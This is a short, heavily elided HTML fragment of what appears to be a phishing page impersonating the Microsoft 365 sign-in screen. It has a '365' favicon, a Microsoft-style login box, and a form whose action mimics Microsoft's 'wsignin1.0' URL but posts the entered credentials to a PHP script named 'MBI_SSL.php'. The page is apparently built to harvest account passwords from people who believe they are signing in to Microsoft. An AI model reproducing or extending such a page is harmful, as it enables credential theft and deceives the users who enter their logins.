...
<head>
    ...
    <link rel="icon" type="image/x-icon" href="files/fav365.ico">
    <style>
               ...
               <div class="col-1">
                    <div class="login-box">
                        <div class="logo">
                            ...
                            <div type="button" style="display: grid;grid-template-columns: auto 1fr;align-items: center;grid-gap: 2px;margin-top: 20px;opacity: .9;">
                        ...
                        <div class="challenge">
                            ...
                            <form action="wsignin1.0&rpsnv=13&ct=1648037205&rver=365-02&wp=MBI_SSL.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                                ...
                                <button name="submit" type="submit" class=" m-t-2">Sign in</button>
                            </form>
                        </div>
                    </div>
                </div>
